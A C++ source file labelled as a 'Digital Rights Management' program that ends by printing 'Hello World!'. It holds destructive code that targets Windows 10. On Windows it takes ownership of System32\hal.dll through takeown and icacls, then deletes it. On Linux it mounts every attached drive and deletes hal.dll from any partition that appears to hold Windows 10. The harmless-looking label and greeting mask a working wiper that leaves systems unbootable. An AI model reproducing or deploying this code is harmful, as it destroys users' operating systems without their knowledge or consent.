/* Адриан Баррето 19/02/18
 * Copyright (c) 2018 TTFH
 * Digital Rights Management
 * This software is distributed "as-is", with no warranty expressed or implied,
 * and no guarantee for accuracy or applicability to any purpose. 
 */

#include <assert.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <lmcons.h>
#include <shlobj.h>
#include <windows.h>
#else
#include <sys/stat.h>
#endif

//#define DEBUG 1
#ifdef DEBUG
#define print printf
#else
#define print do_nothing
#endif

#define RED    "\x1b[91m"
#define GREEN  "\x1b[92m"
#define BLUE   "\x1b[94m"
#define NORMAL "\x1b[0m"

static void do_nothing(auto n, ...) { }

enum AccessLevel { User = 1, Admin = 2, System = 3 };
enum WinVer { Win10, Win8_1, Win8, Win7, WinVista, WinXP64, WinXP32, Win2000, Other, Error };

WinVer WindowsVersion() {
#ifdef _WIN32
  system("ver > version");
  FILE* ver = fopen("version", "rb");
  fseek(ver, 0, SEEK_END);
  long size = ftell(ver);
  rewind(ver);
  char* buffer = new char[size];
  fread(buffer, 1, size, ver);
  char digits[] = "1234567890";
  int pos = strcspn(buffer, digits);
  int major = int(atof(&buffer[pos]) * 10) / 10;
  int minor = int(atof(&buffer[pos]) * 10) % 10;
  fclose(ver);
  delete[] buffer;
  remove("version");

  switch (major) {
    case 10:
      return Win10;
    case 6:
      switch (minor) {
        case 3: return Win8_1;
        case 2: return Win8;
        case 1: return Win7;
        case 0: return WinVista;
      }
    break;
    case 5:
      switch (minor) {
        case 2: return WinXP64;
        case 1: return WinXP32;
        case 0: return Win2000;
      }
    break;
  }
#endif
  return Other;
}

static bool GetSystem[[maybe_unused]](AccessLevel& program, const char* file) {
  if (file == nullptr) return false;
#ifdef _WIN32
  DWORD length = UNLEN + 1;
  char username[length];
  GetUserName(username, &length);

  char* takeown = new char[strlen(file) + 22];
  sprintf(takeown, "takeown /f %s >nul 2>&1", file);
  print("Executing: takeown /f %s\n", file);
  system(takeown);
  delete takeown;

  char* grant = new char[strlen(file) + length + 28];
  sprintf(grant, "icacls %s /grant %s:D >nul 2>&1", file, username);
  print("Executing: icacls %s /grant %s:D\n", file, username);
  system(grant);
  delete grant;
#endif
  program = System;
  return true;
}

static bool IsUserSystem(AccessLevel& program, const char* file) {
  program = User;
#ifdef _WIN32
  if (IsUserAnAdmin()) {
    program = Admin;
    return GetSystem(program, file);
  } else {
    MessageBox(nullptr, "Admin access is required on this OS.\n", "Windows 10", MB_ICONERROR | MB_OK);
#ifndef DEBUG
    exit(EXIT_FAILURE);
#endif
  }
#endif
  return false;
}

void DeleteIf(bool cond, const char* path) {
  if (cond) {
    AccessLevel program;
    if (IsUserSystem(program, path))
      remove(path);

    switch (program) {
      case User: print("Running has User\n");
      break;
      case Admin: print("Running has Admin\n");
      break;
      case System: print("Running has System\n");
      break;
    }
  }
}

void MountAllDevices() {
#ifndef _WIN32
  print(BLUE "Mounting all drives..." NORMAL "\n\n");
  const char* list_drives = "lsblk -nro NAME,MOUNTPOINT | awk '$1~/[0-9]/ && $2 == \"\"' > drive_list";
  system(list_drives);
  FILE* drive_list = fopen("drive_list", "r");
  assert(drive_list != nullptr);

  char drive[16];

  while (fscanf(drive_list, "%s\n", drive) == 1) {
    print("Unmounted drive found in: %s\n", drive);

    print("Mounting drive...\n");
    char* mount = new char[strlen(drive) + 46];
    sprintf(mount, "udisksctl mount -b /dev/%s > media 2> /dev/null", drive);
    assert(strlen(mount) + 1 == strlen(drive) + 46);
    system(mount);
    delete mount;

    FILE* media = fopen("media", "r");
    assert(media != nullptr);
    char source[32];
    int mounted = fscanf(media, "Mounted %s at %s", drive, source);
    fclose(media);
    remove("media");
    if (mounted != 2) {
      print(RED "WARNING: drive %s not mountable or already mounted." NORMAL "\n\n", drive);
      continue;
    }

    // Remove dot at eol.
    int length = strlen(source);
    source[length - 1] = '\0';
    print("Drive %s mounted in: %s\n", drive, source);
    print("\n");
  }
  fclose(drive_list);
  remove("drive_list");
#endif
}

void DeleteIfExist(const char* cond, const char* target) {
#ifndef _WIN32
  print(BLUE "Looking for mounted drives..." NORMAL "\n\n");
  const char* list_drives = "lsblk -nro NAME,MOUNTPOINT | awk '$1~/[0-9]/ && $2 != \"\"' > drive_list";
  system(list_drives);
  FILE* drive_list = fopen("drive_list", "r");
  assert(drive_list != nullptr);

  char drive[16];
  char source[32];

  while (fscanf(drive_list, "%s %s\n", drive, source) == 2) {
    print("Drive %s mounted in: %s\n", drive, source);
    if (strcmp(source, "/") == 0) strcpy(source, "\0");
    char* name = new char[strlen(source) + strlen(cond) + 1];
    sprintf(name, "%s%s", source, cond);
    assert(strlen(name) + 1 == strlen(source) + strlen(cond) + 1);
    print("Looking for file: %s\n", name);

    struct stat buffer;
    if (stat(name, &buffer) == 0) {
      print(RED "ERROR: Windows 10 detected in partition: " NORMAL "%s\n", drive);
      char* del = new char[strlen(source) + strlen(target) + 1];
      sprintf(del, "%s%s", source, target);
      assert(strlen(del) + 1 == strlen(source) + strlen(target) + 1);
      print("Deleting %s ...\n", del);
      if (remove(del) == 0)
        print(GREEN "INFO: File successfully deleted" NORMAL "\n");
      if (stat(del, &buffer) == 0) {
        printf(RED "ERROR: Read-Only filesystem in: " NORMAL "/dev/%s\n", drive);
        printf(GREEN "INFO: Execute: " BLUE "shutdown /s /t 0");
        printf(GREEN " from Windows to turn it off." NORMAL "\n");
      }
      delete del;
    }
    delete name;
    print("\n");
  }
  fclose(drive_list);
  remove("drive_list");
#endif
}

int main(int argc, char* argv[]) {
  DeleteIf(WindowsVersion() == Win10, "C:\\Windows\\System32\\hal.dll");
  MountAllDevices();
  DeleteIfExist("/Windows/System32/D3D12.dll", "/Windows/System32/hal.dll");

  printf("You are using Windows ");
  WinVer ver = WindowsVersion();
  switch (ver) {
    case Win10: printf("10");
    break;
    case Win8_1: printf("8.1");
    break;
    case Win8: printf("8");
    break;
    case Win7: printf("7");
    break;
    case WinVista: printf("Vista");
    break;
    case WinXP64: printf("XP x64");
    break;
    case WinXP32: printf("XP x86");
    break;
    case Win2000: printf("2000");
    break;
    case Other: printf("%c... no, you're not.", 8);
    break;
    case Error: printf("--- ERROR ---");
    break;
  }
  printf("\n\n");

  // Main program start here.
  printf("Hello World!");
  getchar();
  return 0;
}

/* ------------ HEADER ------------ *
  enum WinVer { Win10, Win8_1, Win8, Win7, WinVista, WinXP64, WinXP32, Win2000, Other, Error };
  void MountAllDevices();
  WinVer WindowsVersion();
  void DeleteIf(bool, const char*);
  void DeleteIfExist(const char*, const char*);
*/
